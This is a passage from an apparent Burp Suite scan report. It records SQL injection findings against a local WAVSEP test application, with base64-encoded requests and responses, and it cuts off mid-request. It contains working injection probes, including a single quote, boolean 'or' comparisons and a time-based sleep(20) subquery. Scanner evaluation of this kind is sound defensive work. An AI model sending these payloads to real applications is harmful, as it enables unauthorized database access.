<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>minBalanace</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the minBalanace parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payloads <b>21934482 or 4962=04962</b> and <b>24152135 or 2100=2108</b> were each submitted in the minBalanace parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the minBalanace parameter. The application took <b>20002</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1pbkJhbGFuYWNlPTEwMDAwJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0Njo1MSBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsmIzM5OyBhdCBsaW5lIDE8L3A+PHA+PGI+RGVzY3JpcHRpb248L2I+IFRoZSBzZXJ2ZXIgZW5jb3VudGVyZWQgYW4gdW5leHBlY3RlZCBjb25kaXRpb24gdGhhdCBwcmV2ZW50ZWQgaXQgZnJvbSBmdWxmaWxsaW5nIHRoZSByZXF1ZXN0LjwvcD48aHIgY2xhc3M9ImxpbmUiIC8+PGgzPkFwYWNoZSBUb21jYXQvOC41Ljg0PC9oMz48L2JvZHk+PC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1pbkJhbGFuYWNlPTEwMDAwMjE5MzQ0ODIlMjBvciUyMDQ5NjIlM2QwNDk2Mg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjExIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKU2V2ZXJhbCBhY2NvdW50cyBtYXRjaCB0aGUgY3JpdGVyaWEuCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1pbkJhbGFuYWNlPTEwMDAwMjQxNTIxMzUlMjBvciUyMDIxMDAlM2QyMTA4]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjExIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzYNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKTm8gTWF0Y2guCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWMtQm9vbGVhbkV4cGxvaXQtV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1pbkJhbGFuYWNlPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ3OjEyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjMNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgOCAtIEluamVjdGlvbiBpbnRvIG51bWVyaWMgdmFsdWVzIGluIGEgY2FsY3VsYXRpb24gcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKU2V2ZXJhbCBhY2NvdW50cyBtYXRjaCB0aGUgY3JpdGVyaWEuCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>4522914555884924928</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case09-InjectionInUpdate-Numeric-CommandInjection-WithErrors.jsp [msgid parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgid</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'</b> was submitted in the msgid parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgid parameter. The application took <b>20011</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDktSW5qZWN0aW9uSW5VcGRhdGUtTnVtZXJpYy1Db21tYW5kSW5qZWN0aW9uLVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDktSW5qZWN0aW9uSW5VcGRhdGUtTnVtZXJpYy1Db21tYW5kSW5qZWN0aW9uLVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQptc2dpZD0xJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwMw0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwODo0Njo1MiBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JiMzOTsmIzM5OyBhdCBsaW5lIDE8L3A+PHA+PGI+RGVzY3JpcHRpb248L2I+IFRoZSBzZXJ2ZXIgZW5jb3VudGVyZWQgYW4gdW5leHBlY3RlZCBjb25kaXRpb24gdGhhdCBwcmV2ZW50ZWQgaXQgZnJvbSBmdWxmaWxsaW5nIHRoZSByZXF1ZXN0LjwvcD48aHIgY2xhc3M9ImxpbmUiIC8+PGgzPkFwYWNoZSBUb21jYXQvOC41Ljg0PC9oMz48L2JvZHk+PC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDktSW5qZWN0aW9uSW5VcGRhdGUtTnVtZXJpYy1Db21tYW5kSW5qZWN0aW9uLVdpdGhFcnJvcnMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiA3DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMDktSW5qZWN0aW9uSW5VcGRhdGUtTnVtZXJpYy1Db21tYW5kSW5qZWN0aW9uLVdpdGhFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpT